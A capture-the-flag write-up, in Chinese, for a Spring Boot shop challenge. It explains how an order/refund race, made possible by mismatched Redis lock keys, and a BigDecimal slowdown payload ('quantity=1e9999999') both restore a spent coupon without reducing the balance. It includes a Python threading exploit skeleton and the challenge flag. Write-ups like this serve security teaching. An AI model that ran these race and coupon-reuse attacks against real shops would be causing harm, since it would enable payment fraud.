# UltimateFreeloader

## 题目简述

题目是一套 Spring Boot 商城。新用户有 `10.00` 元余额和一张 `10.00` 元优惠券；取得 flag 必须同时拥有四种商品的 `COMPLETED` 订单、余额仍为 `10.00`，并且至少有一张未使用优惠券。下单与退款都使用 Redis 锁，但下单按用户加锁 `order:user:<userId>`，退款按订单加锁 `refund:order:<orderId>`，两个流程会并发读写同一用户余额和优惠券状态，却不能互斥。

源码还设计了另一条预期链：`quantity` 以字符串进入 `BigDecimal` 运算，可以人为拖慢下单逻辑直到 3 秒锁过期，再复用尚未标记为已使用的优惠券。

## 解题过程

### flag 条件与关键业务顺序

`/api/flag/get` 的检查可以概括为：

```java
completedProductIds.containsAll(allFourProductIds)
user.getBalance().compareTo(new BigDecimal("10.00")) == 0
userCoupons.stream().anyMatch(coupon -> !coupon.getIsUsed())
```

下单与退款分别使用不同锁域：

```java
// createOrder
String lockKey = "order:user:" + userId;       // 3 秒

// refundOrder
String lockKey = "refund:order:" + orderId;    // 5 秒
```

下单先读取用户余额，最后写回 `balance - finalPrice`；退款也先读取余额，最后写回 `balance + order.finalPrice`。它们没有数据库行锁或版本条件，因而存在典型的 lost update。

### PDF 中采用的下单/退款竞争

先用优惠券购买任意商品，得到一个 `finalPrice=0` 的 pivot 订单。此时余额仍为 10，但优惠券已使用。随后同时发起：

1. 退款 pivot 订单；退款线程读取余额 10，准备恢复优惠券，并写回 `10 + 0 = 10`。
2. 不使用优惠券购买目标商品；下单线程也读取余额 10，准备扣除目标价格。

若下单先写入较低余额、退款后写回 10，就会出现以下终态：目标订单为 `COMPLETED`、pivot 订单已退款、余额为 10、优惠券重新可用。由于两条请求的 Redis key 不同，锁不会阻止这个交错。

下面是 PDF 中长脚本的核心骨架；接口返回结构中的 `code`、`data.order.id` 与仓库源码一致：

```python
import threading
import requests

s = requests.Session()
s.headers["Authorization"] = "Bearer <登录得到的 token>"
base = "https://challenge.example"

def buy(product_id, coupon_id=None, quantity="1"):
    body = {"productId": product_id, "quantity": quantity}
    if coupon_id:
        body["couponId"] = coupon_id
    return s.post(f"{base}/api/order/create", json=body).json()

def refund(order_id):
    return s.post(f"{base}/api/order/refund/{order_id}").json()

def race_one(target_product_id, pivot_product_id, coupon_id):
    pivot = buy(pivot_product_id, coupon_id)
    pivot_id = pivot["data"]["order"]["id"]

    t_refund = threading.Thread(target=refund, args=(pivot_id,))
    t_buy = threading.Thread(target=buy, args=(target_product_id,))
    t_refund.start()
    t_buy.start()
    t_refund.join()
    t_buy.join()
```

竞争并非每次都命中。每轮后应读取 `/api/order/my`、`/api/user/info` 和 `/api/coupon/available`，只在“目标订单完成、余额 10、优惠券仍可用”时保留结果；否则退款异常订单并重试。对 Little Potato、Sweet Potato、Fish Fish、Large Potato 依次完成竞争后，请求 `/api/flag/get`，得到：

```text
RCTF{G1ft_F0r_U_My_Br0~}
```

PDF 的四页内容主要是一份完整自动化脚本；原 raw 的“跨页补回”确实属于同一脚本，但长期 WP 不需要保留注册、异常打印和固定题目地址等样板代码，以上骨架保留了决定利用是否成立的状态机。

### 仓库单题 WP 给出的预期解法

`createOrder()` 的顺序是“验证优惠券 → 解析并运算 quantity → 扣余额 → 标记优惠券已使用”，Redis 锁的租期只有 3 秒：

```java
BigDecimal quantity = new BigDecimal(orderRequest.getQuantity());
BigDecimal compare = quantity.subtract(new BigDecimal("100"));
if (compare.compareTo(BigDecimal.ZERO) > 0) {
    quantityNum = 1;
    quantity = BigDecimal.ONE;
}
```

以 `quantity=1e9999999` 发起第一个带优惠券的订单，超大指数参与 `BigDecimal.subtract()` 会造成数秒计算延迟。优惠券已经通过可用性检查，但还没执行 `useCoupon()`；当 3 秒 Redis 锁过期后，再发送第二个使用同一优惠券的普通订单。两个请求最终都会把数量收敛为 1，却可能都按优惠券可用继续执行。退款其中一个零元订单即可恢复优惠券，再对其余商品重复。

这条链说明 DoS 不只是可用性问题：当锁有固定 TTL 且业务会在锁内处理攻击者可控的高复杂度数据时，延迟可以被转化为一致性漏洞。

## 方法总结

- 核心技巧：利用不一致的 Redis 锁粒度制造下单/退款 lost update；预期路线则用 `BigDecimal` 计算延迟耗尽锁租期。
- 识别信号：多个业务流程修改同一余额/库存/优惠券，却使用不同 lock key；固定 TTL 内存在用户可控的高复杂度运算。
- 复用要点：先写清需要维持的最终不变量，再用 pivot 订单构造可回滚的竞争；每次并发后都查询真实状态，不要把 HTTP 200 当作竞争成功。
